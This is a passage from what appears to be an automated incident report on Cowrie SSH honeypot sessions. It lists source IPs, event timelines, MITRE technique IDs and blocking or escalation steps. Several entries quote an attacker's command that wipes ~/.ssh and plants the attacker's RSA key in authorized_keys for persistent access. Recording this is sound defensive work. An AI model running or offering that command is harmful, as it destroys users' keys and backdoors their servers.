| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:07:52` | `cowrie.session.connect` |
| `2026-04-11 06:07:52` | `cowrie.client.version` |
| `2026-04-11 06:07:52` | `cowrie.client.kex` |
| `2026-04-11 06:07:54` | `cowrie.login.success` |
| `2026-04-11 06:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1cb12055a8a

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:07 |
| **Last Seen** | 2026-04-11 06:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:07:59` | `cowrie.session.connect` |
| `2026-04-11 06:07:59` | `cowrie.client.version` |
| `2026-04-11 06:08:00` | `cowrie.client.kex` |
| `2026-04-11 06:08:00` | `cowrie.login.success` |
| `2026-04-11 06:08:00` | `cowrie.session.params` |
| `2026-04-11 06:08:00` | `cowrie.command.input` |
| `2026-04-11 06:08:00` | `cowrie.command.failed` |
| `2026-04-11 06:08:00` | `cowrie.log.closed` |
| `2026-04-11 06:08:00` | `cowrie.session.params` |
| `2026-04-11 06:08:00` | `cowrie.command.input` |
| `2026-04-11 06:08:00` | `cowrie.session.file_download` |
| `2026-04-11 06:08:00` | `cowrie.log.closed` |
| `2026-04-11 06:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e81c1bc8edc

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:08 |
| **Last Seen** | 2026-04-11 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:08:02` | `cowrie.session.connect` |
| `2026-04-11 06:08:02` | `cowrie.client.version` |
| `2026-04-11 06:08:02` | `cowrie.client.kex` |
| `2026-04-11 06:08:03` | `cowrie.login.success` |
| `2026-04-11 06:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c403bff12f

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:08 |
| **Last Seen** | 2026-04-11 06:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:08:06` | `cowrie.session.connect` |
| `2026-04-11 06:08:06` | `cowrie.client.version` |
| `2026-04-11 06:08:06` | `cowrie.client.kex` |
| `2026-04-11 06:08:06` | `cowrie.login.success` |
| `2026-04-11 06:08:07` | `cowrie.session.params` |
| `2026-04-11 06:08:07` | `cowrie.command.input` |
| `2026-04-11 06:08:07` | `cowrie.command.failed` |
| `2026-04-11 06:08:07` | `cowrie.log.closed` |
| `2026-04-11 06:08:07` | `cowrie.session.params` |
| `2026-04-11 06:08:07` | `cowrie.command.input` |
| `2026-04-11 06:08:07` | `cowrie.session.file_download` |
| `2026-04-11 06:08:07` | `cowrie.log.closed` |
| `2026-04-11 06:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6700b0f8515

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:08 |
| **Last Seen** | 2026-04-11 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:08:08` | `cowrie.session.connect` |
| `2026-04-11 06:08:08` | `cowrie.client.version` |
| `2026-04-11 06:08:08` | `cowrie.client.kex` |
| `2026-04-11 06:08:08` | `cowrie.login.success` |
| `2026-04-11 06:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f87852d555c

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:08 |
| **Last Seen** | 2026-04-11 06:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:08:21` | `cowrie.session.connect` |
| `2026-04-11 06:08:21` | `cowrie.client.version` |
| `2026-04-11 06:08:22` | `cowrie.client.kex` |
| `2026-04-11 06:08:22` | `cowrie.login.success` |
| `2026-04-11 06:08:22` | `cowrie.session.params` |
| `2026-04-11 06:08:22` | `cowrie.command.input` |
| `2026-04-11 06:08:22` | `cowrie.command.failed` |
| `2026-04-11 06:08:23` | `cowrie.log.closed` |
| `2026-04-11 06:08:23` | `cowrie.session.params` |
| `2026-04-11 06:08:23` | `cowrie.command.input` |
| `2026-04-11 06:08:23` | `cowrie.session.file_download` |
| `2026-04-11 06:08:23` | `cowrie.log.closed` |
| `2026-04-11 06:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1534b67b87f3

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:08 |
| **Last Seen** | 2026-04-11 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:08:25` | `cowrie.session.connect` |
| `2026-04-11 06:08:25` | `cowrie.client.version` |
| `2026-04-11 06:08:25` | `cowrie.client.kex` |
| `2026-04-11 06:08:26` | `cowrie.login.success` |
| `2026-04-11 06:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b4f78208d7

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:08 |
| **Last Seen** | 2026-04-11 06:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:08:26` | `cowrie.session.connect` |
| `2026-04-11 06:08:26` | `cowrie.client.version` |
| `2026-04-11 06:08:26` | `cowrie.client.kex` |
| `2026-04-11 06:08:27` | `cowrie.login.success` |
| `2026-04-11 06:08:28` | `cowrie.session.params` |
| `2026-04-11 06:08:28` | `cowrie.command.input` |
| `2026-04-11 06:08:28` | `cowrie.command.failed` |
| `2026-04-11 06:08:28` | `cowrie.log.closed` |
| `2026-04-11 06:08:29` | `cowrie.session.params` |
| `2026-04-11 06:08:29` | `cowrie.command.input` |
| `2026-04-11 06:08:29` | `cowrie.session.file_download` |
| `2026-04-11 06:08:29` | `cowrie.log.closed` |
| `2026-04-11 06:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e705fad3b16

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:08 |
| **Last Seen** | 2026-04-11 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:08:32` | `cowrie.session.connect` |
| `2026-04-11 06:08:32` | `cowrie.client.version` |
| `2026-04-11 06:08:32` | `cowrie.client.kex` |
| `2026-04-11 06:08:33` | `cowrie.login.success` |
| `2026-04-11 06:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd81d1d5abd

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:09 |
| **Last Seen** | 2026-04-11 06:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:09:30` | `cowrie.session.connect` |
| `2026-04-11 06:09:30` | `cowrie.client.version` |
| `2026-04-11 06:09:30` | `cowrie.client.kex` |
| `2026-04-11 06:09:30` | `cowrie.login.success` |
| `2026-04-11 06:09:30` | `cowrie.session.params` |
| `2026-04-11 06:09:30` | `cowrie.command.input` |
| `2026-04-11 06:09:30` | `cowrie.command.failed` |
| `2026-04-11 06:09:31` | `cowrie.log.closed` |
| `2026-04-11 06:09:31` | `cowrie.session.params` |
| `2026-04-11 06:09:31` | `cowrie.command.input` |
| `2026-04-11 06:09:31` | `cowrie.session.file_download` |
| `2026-04-11 06:09:31` | `cowrie.log.closed` |
| `2026-04-11 06:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5822bbc879d0

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:09 |
| **Last Seen** | 2026-04-11 06:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:09:33` | `cowrie.session.connect` |
| `2026-04-11 06:09:33` | `cowrie.client.version` |
| `2026-04-11 06:09:33` | `cowrie.client.kex` |
| `2026-04-11 06:09:33` | `cowrie.login.success` |
| `2026-04-11 06:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9681db59789

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:10 |
| **Last Seen** | 2026-04-11 06:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:10:27` | `cowrie.session.connect` |
| `2026-04-11 06:10:27` | `cowrie.client.version` |
| `2026-04-11 06:10:28` | `cowrie.client.kex` |
| `2026-04-11 06:10:29` | `cowrie.login.success` |
| `2026-04-11 06:10:30` | `cowrie.session.params` |
| `2026-04-11 06:10:30` | `cowrie.command.input` |
| `2026-04-11 06:10:30` | `cowrie.command.failed` |
| `2026-04-11 06:10:30` | `cowrie.log.closed` |
| `2026-04-11 06:10:31` | `cowrie.session.params` |
| `2026-04-11 06:10:31` | `cowrie.command.input` |
| `2026-04-11 06:10:32` | `cowrie.session.file_download` |
| `2026-04-11 06:10:32` | `cowrie.log.closed` |
| `2026-04-11 06:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b641b3f38480

| Field | Detail |
|---|---|
| **Source IP** | `43.134.94[.]132` |
| **First Seen** | 2026-04-11 06:10 |
| **Last Seen** | 2026-04-11 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:10:28` | `cowrie.session.connect` |
| `2026-04-11 06:10:28` | `cowrie.client.version` |
| `2026-04-11 06:10:29` | `cowrie.client.kex` |
| `2026-04-11 06:10:29` | `cowrie.login.success` |
| `2026-04-11 06:10:29` | `cowrie.session.params` |
| `2026-04-11 06:10:29` | `cowrie.command.input` |
| `2026-04-11 06:10:29` | `cowrie.log.closed` |
| `2026-04-11 06:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.94[.]132` to AbuseIPDB if not already reported
- [ ] Block `43.134.94[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9806273ea2ce

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:10 |
| **Last Seen** | 2026-04-11 06:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:10:36` | `cowrie.session.connect` |
| `2026-04-11 06:10:36` | `cowrie.client.version` |
| `2026-04-11 06:10:36` | `cowrie.client.kex` |
| `2026-04-11 06:10:38` | `cowrie.login.success` |
| `2026-04-11 06:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa6e80c5ba97

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:10 |
| **Last Seen** | 2026-04-11 06:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:10:45` | `cowrie.session.connect` |
| `2026-04-11 06:10:45` | `cowrie.client.version` |
| `2026-04-11 06:10:45` | `cowrie.client.kex` |
| `2026-04-11 06:10:47` | `cowrie.login.success` |
| `2026-04-11 06:10:48` | `cowrie.session.params` |
| `2026-04-11 06:10:48` | `cowrie.command.input` |
| `2026-04-11 06:10:48` | `cowrie.command.failed` |
| `2026-04-11 06:10:48` | `cowrie.log.closed` |
| `2026-04-11 06:10:49` | `cowrie.session.params` |
| `2026-04-11 06:10:49` | `cowrie.command.input` |
| `2026-04-11 06:10:49` | `cowrie.session.file_download` |
| `2026-04-11 06:10:49` | `cowrie.log.closed` |
| `2026-04-11 06:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76eccca5e963

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:10 |
| **Last Seen** | 2026-04-11 06:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:10:53` | `cowrie.session.connect` |
| `2026-04-11 06:10:53` | `cowrie.client.version` |
| `2026-04-11 06:10:53` | `cowrie.client.kex` |
| `2026-04-11 06:10:55` | `cowrie.login.success` |
| `2026-04-11 06:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced111775b51

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:00` | `cowrie.session.connect` |
| `2026-04-11 06:11:00` | `cowrie.client.version` |
| `2026-04-11 06:11:00` | `cowrie.client.kex` |
| `2026-04-11 06:11:00` | `cowrie.login.success` |
| `2026-04-11 06:11:00` | `cowrie.session.params` |
| `2026-04-11 06:11:00` | `cowrie.command.input` |
| `2026-04-11 06:11:00` | `cowrie.command.failed` |
| `2026-04-11 06:11:00` | `cowrie.log.closed` |
| `2026-04-11 06:11:01` | `cowrie.session.params` |
| `2026-04-11 06:11:01` | `cowrie.command.input` |
| `2026-04-11 06:11:01` | `cowrie.session.file_download` |
| `2026-04-11 06:11:01` | `cowrie.log.closed` |
| `2026-04-11 06:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af9706f8e6a8

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:02` | `cowrie.session.connect` |
| `2026-04-11 06:11:02` | `cowrie.client.version` |
| `2026-04-11 06:11:02` | `cowrie.client.kex` |
| `2026-04-11 06:11:03` | `cowrie.login.success` |
| `2026-04-11 06:11:03` | `cowrie.session.closed` |

